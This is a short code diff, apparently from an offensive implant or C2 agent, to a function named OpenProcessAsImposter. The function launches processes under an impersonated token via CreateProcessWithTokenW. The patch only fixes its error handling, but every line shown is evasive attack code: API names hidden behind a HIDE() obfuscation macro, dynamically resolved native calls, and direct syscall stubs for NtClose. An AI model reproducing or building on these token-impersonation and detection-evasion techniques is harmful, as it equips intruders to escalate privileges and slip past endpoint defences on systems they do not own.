@@ -427,7 +427,7 @@ BOOL ProcessManager::OpenProcessAsImposter(
         si.hStdInput  = nullptr;
     }
 
-    GetNative<::_CreateProcessWithTokenW>(( char* ) HIDE("CreateProcessWithTokenW")).call(
+    BOOL created = GetNative<::_CreateProcessWithTokenW>(( char* ) HIDE("CreateProcessWithTokenW")).call(
         token,
         dwLogonFlags,
         lpApplicationName,
@@ -440,7 +440,12 @@ BOOL ProcessManager::OpenProcessAsImposter(
     );
 
     if ( !saveOutput )
-        return TRUE;
+        return created;
+
+    if ( !created ) {
+        cmdOutput = (char*)HIDE("The command requested to perform failed.");
+        return FALSE;
+    }
 
     GetAndInsertSSN(NTDLL, (char*)HIDE("NtClose"));
     SysNtClose(writeTo);
